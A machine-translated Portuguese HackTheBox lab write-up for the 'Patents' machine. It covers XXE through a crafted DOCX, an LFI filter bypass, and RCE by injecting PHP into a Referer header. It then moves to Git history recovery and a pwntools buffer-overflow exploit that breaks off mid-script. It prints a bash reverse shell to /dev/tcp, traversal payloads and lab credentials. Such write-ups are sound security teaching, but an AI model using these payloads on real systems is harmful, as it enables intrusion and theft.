<!doctype html>
<html class="no-js" lang="pt">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>‚òÆÔ∏è üï∫ üçû HackTheBox. Patentes de passagem. XXE via DOCX, LFI para RCE, GIT e arquivos de cadeia ROP ‚òùüèø üë®‚Äçüëß‚Äçüëß üßñüèª</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Continuo publicando solu√ß√µes enviadas para processamento adicional no site da HackTheBox . 
 
 Neste artigo, exploramos o XXE no servi√ßo de convers√£o ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>HackTheBox. Patentes de passagem. XXE via DOCX, LFI para RCE, GIT e arquivos de cadeia ROP</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/502268/"><div style="text-align:center;"><img src="https://habrastorage.org/webt/mc/3s/xg/mc3sxg5brnrlwn3qmajb37t8bhk.png" alt="imagem"></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Continuo publicando solu√ß√µes enviadas para </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">processamento adicional</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> no site da </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=" rel="nofollow"><font style="vertical-align: inherit;">HackTheBox</font></a><font style="vertical-align: inherit;"> . </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Neste artigo, exploramos o XXE no servi√ßo de convers√£o de documentos DOCX para PDF, obtemos o RCE via LFI, cavamos no hist√≥rico do GIT e restauramos arquivos, compomos cadeias de ROP usando pwntools e localizamos um arquivo raiz oculto. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
A conex√£o ao laborat√≥rio √© via VPN. </font><font style="vertical-align: inherit;">√â recomend√°vel n√£o conectar-se a partir de um computador de trabalho ou de um host em que os dados importantes estejam dispon√≠veis, pois voc√™ entra em uma rede privada com pessoas que sabem algo no campo da seguran√ßa da informa√ß√£o :)</font></font><br>
<br>
<div class="spoiler" role="button" tabindex="0">
                        <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Informa√ß√µes Organizacionais</font></font></b>
                        <div class="spoiler_text">      ,     ,   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=" rel="nofollow">  Telegram</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=" rel="nofollow">    </a>   .    , ,    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=" rel="nofollow">    </a>.<br>
<a name="habracut"></a><br>
      .          ,  -      ,      .<br>
</div>
                    </div><br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Recon</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Esta m√°quina possui um endere√ßo IP 10.10.10.173, que eu adiciono ao / etc / hosts.</font></font><br>
<br>
<pre><code class="plaintext hljs">10.10.10.173    patents.htb</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Primeiro, examinamos portas abertas. </font><font style="vertical-align: inherit;">Como leva muito tempo para varrer todas as portas com o nmap, primeiro farei isso com o masscan. </font><font style="vertical-align: inherit;">Examinamos todas as portas TCP e UDP da interface tun0 a uma velocidade de 500 pacotes por segundo.</font></font><br>
<br>
<pre><code class="bash hljs">masscan -e tun0 -p1-65535,U:1-65535 10.10.10.173 --rate=500</code></pre><br>
<img src="https://habrastorage.org/webt/7v/ex/jr/7vexjrz3cmdge_csif-0ruxstxy.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Agora, para obter informa√ß√µes mais detalhadas sobre os servi√ßos que operam nas portas, executaremos uma varredura com a op√ß√£o -A.</font></font><br>
<br>
<pre><code class="bash hljs">nmap -A patents.htb -p22,80,8888</code></pre><br>
<img src="https://habrastorage.org/webt/nk/d8/jm/nkd8jml8rg_aau8otsuwznq-ab0.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
O host executa servi√ßos SSH e o servidor da web Apache, com a porta 8888 reservada para um servi√ßo incompreens√≠vel. </font><font style="vertical-align: inherit;">Vamos ver a web. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/q4/ba/lv/q4balvxmcp7ac3m0qqge2qtwhcm.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
O site possui um formul√°rio de download de documentos DOCX.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/m4/xk/if/m4xkiftz0h6oxfikutspnmyijdy.png" alt="imagem"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">XXE DOCX</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Segundo a declara√ß√£o, nosso documento ser√° convertido para o formato PDF. Isso sugere o pensamento de XXE. Eu peguei um exemplo </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">daqui</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font></font><br>
<br>
<img src="https://habrastorage.org/webt/eg/mo/fo/egmofoq1l5r8ohdmorvwf83gsfe.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Assim, neste exemplo, o host tentar√° baixar o documento xml do servidor remoto. Ao fazer o download deste documento, ele ler√° o arquivo local especificado no documento xml baixado, codificar√° em base64 e entrar√° em contato com nosso servidor novamente, passando o arquivo codificado como um par√¢metro de solicita√ß√£o. Ou seja, ao decodificar esse par√¢metro, obtemos o arquivo da m√°quina remota. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mas essa carga n√£o deve ser colocada no caminho word / document.xml. Como o OpenXML SDK √© usado para trabalhar com esse tipo de documento, segue </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-se daqui</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> e </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">daqui</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">, o software do servidor procurar√° dados no word / document.xml e no customXML / item1.xml. Portanto, a carga deve ser colocada l√°. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Vamos criar um documento docx e descompact√°-lo como um arquivo zip. Depois disso, crie o diret√≥rio customXML e crie o arquivo item1.xml nele. Nele, escreveremos o c√≥digo da imagem acima, alterando o endere√ßo IP para o nosso. E arquivamos o documento de volta. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/s0/j_/gw/s0j_gwgd0ehur9mboxtcwz8eudg.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Agora execute o servidor da web local.</font></font><br>
<br>
<pre><code class="bash hljs">python3 -m http.server 80</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
E no diret√≥rio atual, criamos o segundo arquivo xml, especificando / etc / passwd como o arquivo desejado. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/6y/5s/l7/6y5sl7j1lcilayxrtbebn9z78tw.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
E fa√ßa o upload do documento para o servidor. Na janela com o servidor da web em execu√ß√£o, veremos a conex√£o reversa. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/fj/za/to/fjzatoxzmrvwpkccdyekqyig_ju.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Decodifique base64 e obtenha o arquivo solicitado. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ef/wy/ty/efwytya0_ldxuvv1qd9qjphrib0.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dessa forma, podemos ler arquivos no servidor. Vamos ler os arquivos de configura√ß√£o do Apache. Para fazer isso, altere dtd.xml e repita o download do documento. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/um/0q/xq/um0qxqy-zxbvhbbe-dgz2_05msy.png" alt="imagem"><br>
<br>
<img src="https://habrastorage.org/webt/-x/nf/zh/-xnfzhmk9bbhd8fjx5eko5vbaeg.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ent√£o, descobrimos o diret√≥rio em que o site est√° localizado. Vamos tentar ler o arquivo de configura√ß√£o. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/_b/dd/-v/_bdd-vrylmvfa98iklgx3lnykzi.png" alt="imagem"><br>
<br>
<img src="https://habrastorage.org/webt/pq/5l/ht/pq5lhtyyzajjcijlbaa0hubw5j4.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
E o coment√°rio diz que o arquivo foi renomeado devido √† vulnerabilidade. Naturalmente, vamos nos referir a ele </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">patents.htb / getPatent_alphav1.0.php</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> .</font></font><br>
<br>
<img src="https://habrastorage.org/webt/hq/wd/hj/hqwdhjf6zhjdaehc2zn6ic5p3hu.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Voltando a esta p√°gina e passando o caminho ../../../../../etc/passwd como o par√¢metro id, todas as ocorr√™ncias de "../" ser√£o exclu√≠das da nossa linha. </font><font style="vertical-align: inherit;">Vamos substituir cada linha "../" por "... /. /". Portanto, se voc√™ excluir uma sequ√™ncia, ela permanecer√° "../". </font></font><br>
<br>
<img src="https://habrastorage.org/webt/fr/a3/pu/fra3pugykwho9xrl9xcklono1zg.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
E n√≥s encontramos LFI.</font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ponto de entrada</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Vamos tentar obter o RCE disso. </font><font style="vertical-align: inherit;">Francamente - foi dif√≠cil. </font><font style="vertical-align: inherit;">O fato √© que, ao enviar um documento desse tipo, n√£o recebemos uma oferta para baixar PDF. </font><font style="vertical-align: inherit;">Ou seja, o descritor 2 foi usado (para exibir mensagens de diagn√≥stico e depura√ß√£o em formato de texto). </font><font style="vertical-align: inherit;">E podemos nos voltar para ele. </font><font style="vertical-align: inherit;">Vamos codificar o shell reverso em base64:</font></font><br>
<br>
<pre><code class="bash hljs">/bin/bash -c <span class="hljs-string">'/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.211/4321 0&gt;&amp;1;'</span></code></pre><pre><code class="bash hljs">L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjExLzQzMjEgMD4mMTsn</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Vamos decodific√°-lo e pass√°-lo para a fun√ß√£o de sistema em php. </font><font style="vertical-align: inherit;">Vamos passar o c√≥digo como um cabe√ßalho HTTP ao fazer upload de um arquivo.</font></font><br>
<br>
<pre><code class="bash hljs">curl http://patents.htb/convert.php -F <span class="hljs-string">"userfile=@file.docx"</span> -F <span class="hljs-string">'submit=Generate PDF'</span> --referer <span class="hljs-string">'http://test.com/&lt;?php system(base64_decode("L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjExLzQzMjEgMD4mMTsn")); ?&gt;'</span></code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Execute o netcat.</font></font><br>
<br>
<pre><code class="bash hljs">nc -lvp 4321</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
E agora vamos ao segundo descritor.</font></font><br>
<br>
<pre><code class="bash hljs">curl http://patents.htb/getPatent_alphav1.0.php?id=....//....//....//....//....//....//....//proc//self//fd//2</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Voltamos a conectar. </font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ROOT 1</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Carregue as transfer√™ncias de sistema de script </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">linpeas</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> e analise cuidadosamente a sa√≠da. </font><font style="vertical-align: inherit;">Ent√£o, trabalhamos em um cont√™iner de encaixe. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/sa/hf/xz/sahfxzrubyathg6rglkqhwf0cvo.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Tamb√©m encontramos hashes. </font><font style="vertical-align: inherit;">Mas hackers, chegamos a nada. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/bf/cc/dy/bfccdyitk-1ksi7qmg5omq_lesw.png" alt="imagem"><br>
<br>
<img src="https://habrastorage.org/webt/dv/ss/up/dvssupnunggkpzz64gsfdxjveuw.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Portanto, execute </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pspy64</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> para rastrear os processos em execu√ß√£o. </font><font style="vertical-align: inherit;">E encontramos o in√≠cio do processo como root, no qual a senha √© passada como uma vari√°vel de ambiente. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/wi/2_/yz/wi2_yzfeqgi3eehjxylmqf7k8vm.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
E altere localmente o usu√°rio digitando esta senha.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/iu/bi/yu/iubiyu543de3olgssz1ry-djuf4.png" alt="imagem"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ROOT 2</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Vamos ver o que esse script faz. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ck/vk/h-/ckvkh-wezr0ofumiqzzqakn5wog.png" alt="imagem"><br>
<br>
<img src="https://habrastorage.org/webt/rg/tf/rs/rgtfrsor5irhivfoifw-jr6c008.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Recebemos uma dica sobre algum servidor lfms e tamb√©m salvamos o nome de usu√°rio e a senha. </font><font style="vertical-align: inherit;">Vamos procurar no sistema tudo relacionado ao lfm. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/af/hz/ea/afhzea8jusqqac6irjgch6kyvjy.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
E encontramos o reposit√≥rio git neste diret√≥rio. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ln/h4/op/lnh4opchyrjvoc88mmg8kiwe7_y.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Vamos trabalhar com este reposit√≥rio. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/gq/by/ge/gqbygeqd2j4xoshvorswvluxkno.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Vamos ver o hist√≥rico das mudan√ßas. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/t7/ro/rj/t7rorjk0v42cfsjtphjd9uc1fs0.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Vamos ver o hist√≥rico das mudan√ßas. </font><font style="vertical-align: inherit;">Ent√£o, vemos que no pen√∫ltimo commit, um arquivo execut√°vel e uma descri√ß√£o foram adicionados e, no √∫ltimo, eles j√° foram exclu√≠dos. </font><font style="vertical-align: inherit;">Vamos reverter antes de excluir arquivos.</font></font><br>
<br>
<pre><code class="bash hljs">git revert 7c6609240f414a2cb8af00f75fdc7cfbf04755f5</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
E em nosso diret√≥rio apareceu um arquivo execut√°vel e uma descri√ß√£o. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ga/wc/4s/gawc4s_vovqdv6zz91jdrdbicfk.png" alt="imagem"><br>
<br>
<img src="https://habrastorage.org/webt/y5/ns/gi/y5nsgibu66e8a0_g_34mde9b2ao.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Aqui eu j√° queria come√ßar a reverter o arquivo, mas - n√≥s temos um projeto git! </font><font style="vertical-align: inherit;">Eu encontrei um commit que mencionava c√≥digos fonte. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/7m/xr/ki/7mxrkibt8ixidkd4tir6ksasywk.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
E vamos restaurar os arquivos.</font></font><br>
<br>
<pre><code class="bash hljs">git checkout 0ac7c940010ebb22f7fbedb67ecdf67540728123</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Depois disso, baixamos os c√≥digos-fonte de interesse, o pr√≥prio programa e as bibliotecas para a m√°quina local. </font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Rop</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Precisamos tentar encontrar e explorar a vulnerabilidade no programa, existem c√≥digos-fonte para ajudar. </font><font style="vertical-align: inherit;">Vamos verificar a prote√ß√£o em um arquivo bin√°rio. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/pq/fj/bd/pqfjbdyozi1qaxhxeauf1_hfcca.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ou seja, o can√°rio e a TORTA est√£o ausentes, mas a pilha n√£o √© execut√°vel. </font><font style="vertical-align: inherit;">Vamos abrir o arquivo bin√°rio em qualquer desmontador com um descompilador conveniente para voc√™ (eu uso o IDA Pro 7.2) e comparar o c√≥digo descompilado com os c√≥digos-fonte do reposit√≥rio. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/tz/rc/ue/tzrcued2khgzxq9jmhziq7vsfl4.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Para conectar-se ao servidor e usar os dados do arquivo checker.py, al√©m de credenciais. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/xh/7b/aa/xh7baayunbtjue28qyfleddzqxc.png" alt="imagem"><br>
<br>
<img src="https://habrastorage.org/webt/-r/rp/mo/-rrpmoh0l0-hginwoubihqb3a_g.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Vamos escrever um modelo de explora√ß√£o.</font></font><br>
<br>
<pre><code class="python hljs"><span class="hljs-comment">#!/usr/bin/python3</span><font></font>
<font></font>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<font></font>
<font></font>
context(os=<span class="hljs-string">"linux"</span>, arch=<span class="hljs-string">"amd64"</span>)<font></font>
HOST = <span class="hljs-string">"127.0.0.1"</span>
PORT = <span class="hljs-number">8888</span>
username = <span class="hljs-string">"lfmserver_user"</span>
password = <span class="hljs-string">"!gby0l0r0ck$$!"</span></code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Vamos agora determinar a solicita√ß√£o. </font><font style="vertical-align: inherit;">Inicie o aplicativo. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/wx/xj/iu/wxxjiuq1vfqmwzgrshyjzlmzzou.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Voc√™ deve enviar o caminho para o arquivo e o hash de seu conte√∫do. </font><font style="vertical-align: inherit;">Por exemplo, peguei o / etc / hosts. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/p0/3k/ek/p03kekiuesrd9mc2at4t_swcce0.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Adicione o seguinte c√≥digo ao modelo.</font></font><br>
<br>
<pre><code class="python hljs">INPUTREQ = <span class="hljs-string">"CHECK /{} LFM\r\nUser={}\r\nPassword={}\r\n\r\n{}\n"</span>
file = <span class="hljs-string">"/etc/hosts"</span>
md5sum = <span class="hljs-string">"7d8fc74dc6cc8517a81a5b00b8b9ec32"</span><font></font>
send_ = INPUTREQ.format(file,username, password, md5sum)<font></font>
<font></font>
r = remote(HOST, PORT)<font></font>
r.sendline(send_.encode())<font></font>
<font></font>
r.interactive()</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Agora execute e obtenha o erro 404. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ej/nd/b6/ejndb6z2tpkgvajgiq3akvwsbjg.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Vamos ver o arquivo de log. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/qy/d6/gf/qyd6gftg9f6m3ce87f9acdpsodc.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
√â claro onde o aplicativo est√° procurando um arquivo, vamos brincar com os caminhos e especificar esse arquivo.</font></font><br>
<br>
<pre><code class="python hljs">file = <span class="hljs-string">"../../../../../etc/hosts"</span></code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Vamos executar o c√≥digo e n√£o veremos nenhum erro. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/px/sp/o-/pxspo-1bkqx14dpydxmj11odvyo.png" alt="imagem"><br>
<br>
<img src="https://habrastorage.org/webt/id/8x/7z/id8x7zspwbcbv1u9qmx-ccjhiis.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mas no caso do urlencode, obtemos uma resposta com o c√≥digo 200 do servidor!</font></font><br>
<br>
<pre><code class="python hljs">file = <span class="hljs-string">"%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fhosts"</span></code></pre><br>
<img src="https://habrastorage.org/webt/uh/pt/s6/uhpts6ydsvnhutaadndkfzt_ejy.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
√ìtimo, vamos voltar ao desmontador. Encontramos entre as linhas (Shift + F12) uma resposta bem-sucedida do servidor. E vamos ver onde √© acessado (X). </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ck/ef/so/ckefsoopnkpezgsq6cdlguv7jh8.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
E passamos para a primeira fun√ß√£o, onde no in√≠cio h√° uma verifica√ß√£o de credenciais. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/8v/6y/jg/8v6yjgpj94ih9fln0dmhbl3_zas.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Vamos renomear as linhas vari√°veis ‚Äã‚Äãna janela do desmontador para facilitar o entendimento no descompilador. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/dz/ut/vx/dzutvxrxvyv4tdq_zgldkiv9xqw.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
E analisando o c√≥digo nas linhas 18-24, entendendo o seguinte: parte da entrada do usu√°rio cai na fun√ß√£o sub_402DB9, onde a sequ√™ncia √© convertida no nome da vari√°vel, que depois cai na fun√ß√£o de acesso e, se o resultado for negativo, a mensagem 404 ser√° exibida. o nome da vari√°vel ser√° o caminho para o arquivo. Como a solicita√ß√£o foi processada mesmo na codifica√ß√£o de URL, essa fun√ß√£o provavelmente √© necess√°ria para decodifica√ß√£o.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/mo/eb/wj/moebwjpolutcowo7qxeyi15dj-k.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mas o fato √© que o nome da vari√°vel, onde os dados s√£o transferidos, √© de tamanho limitado. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/u_/jz/ht/u_jzhtdqgp1vgp3qyuguunuxl_i.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Assim, para o estouro de buffer, precisamos transferir 0xA0 = 160 bytes. Vamos adicionar no c√≥digo a fun√ß√£o de adicionar at√© 160 bytes e codificar o caminho para o arquivo. Como o hash √© calculado a partir do conte√∫do do arquivo, √© necess√°rio n√£o violar a integridade do caminho do arquivo, ou seja, ap√≥s o caminho principal adicionar 0x00 bytes. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mas o fato √© que precisamos conhecer o hash de qualquer arquivo no servidor, que estar√° sempre dispon√≠vel e nunca ser√° alterado. Por exemplo, / proc / sys / kernel / randomize_va_space e, como lembramos da sa√≠da do linPEAS, o ASLR √© ativado, ou seja, conhecemos o hash. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/tz/dk/j_/tzdkj_hdn9owhtmod5ekklqior4.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ent√£o mude o c√≥digo.</font></font><br>
<br>
<pre><code class="python hljs"><span class="hljs-comment">#!/usr/bin/python3</span>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<font></font>
<font></font>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">append_and_encode</span>(<span class="hljs-params">file, rop=<span class="hljs-string">b""</span></span>):</span>
    ret = <span class="hljs-string">b""</span>
    path = (file + <span class="hljs-string">b"\x00"</span>).ljust(<span class="hljs-number">160</span>, <span class="hljs-string">b"A"</span>) + rop
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> path:<font></font>
        ret += <span class="hljs-string">b"%"</span> + hex(i)[<span class="hljs-number">2</span>:].rjust(<span class="hljs-number">2</span>,<span class="hljs-string">"0"</span>).encode()
    <span class="hljs-keyword">return</span> ret<font></font>
<font></font>
context(os=<span class="hljs-string">"linux"</span>, arch=<span class="hljs-string">"amd64"</span>, log_level=<span class="hljs-string">"error"</span>)<font></font>
<font></font>
HOST = <span class="hljs-string">"127.0.0.1"</span>
PORT = <span class="hljs-number">8888</span>
INPUTREQ = <span class="hljs-string">b"CHECK /{1} LFM\r\nUser=lfmserver_user\r\nPassword=!gby0l0r0ck$$!\r\n\r\n{2}\n"</span>
md5sum = <span class="hljs-string">b"26ab0db90d72e28ad0ba1e22ee510510"</span><font></font>
